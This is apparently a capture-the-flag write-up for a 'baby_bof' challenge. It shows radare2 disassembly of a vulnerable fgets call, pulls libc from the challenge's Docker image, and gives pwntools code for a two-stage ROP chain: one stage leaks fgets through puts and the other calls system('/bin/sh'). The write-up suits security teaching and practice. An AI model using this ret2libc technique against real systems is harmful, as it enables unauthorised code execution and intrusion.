# Baby bof

In this challenge you are given a binary, `baby_bof` and a dockerfile, and you are required to find the flag, presumably through `system('/bin/sh')`.

Running the binary, you get the following output, with the input being `asdf`:
```
$ ./baby_bof
plz don't rop me
asdf
i don't think this will work
```
So, opening up the binary in Radare2 and running the `i` command:
```
[0x004005f2]> i
fd       3
file     baby_bof
size     0x20d8
humansz  8.2K
mode     r-x
format   elf64
iorw     false
block    0x100
type     EXEC (Executable file)
arch     x86
baddr    0x400000
binsz    6549
bintype  elf
bits     64
canary   false
class    ELF64
compiler GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
crypto   false
endian   little
havecode true
intrp    /lib64/ld-linux-x86-64.so.2
laddr    0x0
lang     c
linenum  true
lsyms    true
machine  AMD x86-64 architecture
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    NONE
sanitiz  false
static   false
stripped false
subsys   linux
va       true
```
We see that this binary has no stack canary and isn't a PIE. So, this is a candidate for a stack buffer overflow.

Coming back to r2, we look in the disassembly of `main` and see that it runs `vuln`.
`vuln` is just a basic buffer overflow vulnerability: it gets `0x100` bytes into a `0x10` byte buffer with `fgets`.
```
┌ 59: sym.vuln ();
│           ; var char *s @ rbp-0xa
│           0x004005b7      55             push rbp
│           0x004005b8      4889e5         mov rbp, rsp
│           0x004005bb      4883ec10       sub rsp, 0x10
│           0x004005bf      488d3dde0000.  lea rdi, str.plz_dont_rop_me    ; 0x4006a4 ; "plz don't rop me" ; const char *s
│           0x004005c6      e8d5feffff     call sym.imp.puts           ;[2] ; int puts(const char *s)
│           0x004005cb      488b156e0a20.  mov rdx, qword [obj.stdin]    ; obj.__TMC_END__
│                                                                      ; [0x601040:8]=0 ; FILE *stream
│           0x004005d2      488d45f6       lea rax, [s]
│           0x004005d6      be00010000     mov esi, 0x100              ; 256 ; int size
│           0x004005db      4889c7         mov rdi, rax                ; char *s
│           0x004005de      e8ddfeffff     call sym.imp.fgets          ;[3] ; char *fgets(char *s, int size, FILE *stream)
│           0x004005e3      488d3dcb0000.  lea rdi, str.i_dont_think_this_will_work    ; 0x4006b5 ; "i don't think this will work" ; const char *s
│           0x004005ea      e8b1feffff     call sym.imp.puts           ;[2] ; int puts(const char *s)
│           0x004005ef      90             nop
│           0x004005f0      c9             leave
└           0x004005f1      c3             ret
```

So, what is our goal? Preferably, `/bin/sh`. How can we do that relatively easily, with a ROP chain and no pre-existing code? Ret2libc.
That's where the `Dockerfile` comes in. Looking in the dockerfile, you see it pulls a certain version of Ubuntu.
Except if Ubuntu 20.04 has updated its glibc during the CTF, the glibc installed in this dockerfile should be the exact same build as the one on the remote system.

So, to get the glibc:
```bash
mkdir tmp && cd $_
cp ../Dockerfile .
docker build .
docker images | head -2 # copy the image's ID, in my case it's b9513f2c6b0d
docker image save b9513f2c6b0d > img.tar
tar xf img.tar
for f in `ls */layer.tar`; do
	tar xf $f
done
cp `find -name libc.so.6` ..
```

Now we have the glibc, lets find some offsets. What do we need offsets for, though?

## First chain

Thinking ahead, we should get the offset for a function in the GOT that has already been called before the exploit runs. Lets pick `fgets()`.

So, to find `fgets()` in `libc.so.6`, we open it up in Radare2, run the `aaaa` command to analyse the binary, and then run the command `s sym.fgets`.
This leaves us at the address `0x000857b0`, where `0x0` is the base address.
Next, we want the address of `system()`. Through the same process as `fgets()`, we find the offset `0x00055410`.
Finally, we want the string `/bin/sh`. To find this, run the `/ /bin/sh` in Radare2 to get the offset `0x001b75aa`.

Now we have all our offsets, we can start searching for gadgets to construct our ROP chain.

First, we want gadgets to print the address of `fgets()` in glibc so that we can use this to calculate offsets.
So, we need a gadget to `pop rdi`. Using `ropper -f baby_bof --search 'pop rdi'` we get the gadget `pop rdi; ret;` at `0x400683`, which is optimal.

Next, we need a function to call and some arguments to apply.

I've picked the function `puts()`, and will be accessing it via the Procedure Linkage Table. So, we run `s sym.imp.puts` in r2 to get the address `0x4004a0`.
As an argument, we will have the GOT entry of `fgets()`, so that we can leak the libc address. To find this, just run `s sym..got.plt` in r2, and find the address of `reloc.fgets`, which is `0x601028` in our case.

Finally, we need a return address. Because we want to run another chain after this, we just set this to the start of `vuln`, so `0x4005b8` (not `0x4005b7 because we've messed up our base pointer in the previous chain).

So, joining it all together:
```python
from pwn import *

fgets_offset = 0x0857b0
str_bin_sh_offset = 0x1b75aa
system_offset = 0x055410

poprdi = p64(0x400683)
puts_plt = p64(0x4004a0)
fgets_got = p64(0x601028)
vuln = p64(0x4005b8)

payload = (b'\x41'*18) + poprdi + fgets_got + puts_plt + vuln
```
I found the offset of 18 by stepping through the execution in PwnDbg.

Now, when we send this to our server, it sends back the address of `fgets` in glibc.

Now, from that we can calculate our absolute addresses for `/bin/sh` and `system()` in glibc.

## Second chain

This chain just uses our calculated libc addresses to pop a shell:
```python
...
recvd = # get received address and convert it to an integer
base = recvd - fgets_offset

str_bin_sh = p64(base + str_bin_sh_offset)
system = p64(base + system_offset)

payload = (b'\x41'*18) + poprdi + str_bin_sh + system
```

The final script is in [sol.py](sol.py).
